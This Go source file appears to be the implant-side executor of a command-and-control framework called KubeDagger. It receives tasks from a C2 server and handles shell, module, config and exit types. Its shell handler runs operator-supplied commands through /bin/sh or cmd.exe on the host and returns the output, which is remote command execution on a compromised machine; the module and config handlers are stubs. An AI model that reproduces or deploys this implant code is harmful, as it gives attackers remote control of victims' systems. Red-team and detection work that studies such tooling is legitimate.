package agent

import (
	"context"
	"fmt"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/yasindce1998/KubeDagger/pkg/c2server"
)

const (
	DefaultExecTimeout = 120 * time.Second
)

type Executor struct{}

func NewExecutor() *Executor {
	return &Executor{}
}

func (e *Executor) Execute(ctx context.Context, task *c2server.TaskResponse) (string, error) {
	switch task.Type {
	case c2server.TaskShell:
		return e.execShell(ctx, task.Payload)
	case c2server.TaskModule:
		return e.execModule(ctx, task.Payload)
	case c2server.TaskConfig:
		return e.execConfig(task.Payload)
	case c2server.TaskExit:
		return "exiting", nil
	default:
		return "", fmt.Errorf("unsupported task type: %s", task.Type)
	}
}

func (e *Executor) execShell(ctx context.Context, payload map[string]string) (string, error) {
	cmd := payload["command"]
	if cmd == "" {
		return "", fmt.Errorf("missing command in payload")
	}

	timeout := DefaultExecTimeout
	if t, ok := payload["timeout"]; ok {
		if d, err := time.ParseDuration(t); err == nil {
			timeout = d
		}
	}

	execCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	var proc *exec.Cmd
	if runtime.GOOS == "windows" {
		proc = exec.CommandContext(execCtx, "cmd.exe", "/c", cmd)
	} else {
		proc = exec.CommandContext(execCtx, "/bin/sh", "-c", cmd)
	}

	output, err := proc.CombinedOutput()
	result := strings.TrimSpace(string(output))

	if execCtx.Err() == context.DeadlineExceeded {
		return result, fmt.Errorf("command timed out after %s", timeout)
	}

	if err != nil {
		return result, fmt.Errorf("exec: %w", err)
	}
	return result, nil
}

func (e *Executor) execModule(ctx context.Context, payload map[string]string) (string, error) {
	name := payload["name"]
	if name == "" {
		return "", fmt.Errorf("missing module name")
	}
	return "", fmt.Errorf("module %q not loaded", name)
}

func (e *Executor) execConfig(payload map[string]string) (string, error) {
	return "config updated", nil
}
